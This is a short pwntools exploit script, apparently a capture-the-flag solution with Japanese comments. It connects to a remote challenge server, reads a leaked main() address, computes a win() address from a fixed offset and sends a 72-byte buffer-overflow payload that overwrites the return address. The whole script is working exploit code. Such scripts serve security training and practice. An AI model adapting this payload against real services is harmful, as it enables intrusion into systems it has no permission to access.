from pwn import *

p = remote('34.170.146.252', 19295)

# mainのアドレスを取得
p.recvuntil(b'main function: ')
main_addr = int(p.recvline().strip(), 16)

# mainとwinのオフセットを事前に計算 (nm chalで確認)
# 例: win = 0x401156, main = 0x401169 なら offset = -0x13
offset = -0x24  # 実際の値に置き換える
win_addr = main_addr + offset

print(f"[+] main: {hex(main_addr)}")
print(f"[+] win: {hex(win_addr)}")

payload = b'A' * 72 + p64(win_addr)
p.sendline(payload)
p.interactive()
